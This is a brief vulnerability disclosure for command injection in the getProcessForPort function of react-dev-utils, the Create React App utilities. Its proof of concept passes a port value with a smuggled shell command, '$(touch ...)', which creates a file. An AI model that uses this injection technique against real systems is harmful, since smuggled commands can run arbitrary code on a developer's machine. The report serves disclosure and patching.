## description
react-dev-utils includes some utilities used by Create React App. 

The function getProcessForPort in react-dev-utils is vulnerable to command injection.

## PoC
Create a .js file with the content below and run it, then the file pzhou@shu can be illegally created.

var getProcessForPort = require('react-dev-utils/getProcessForPort');

getProcessForPort('11;$(touch pzhou@shu)');
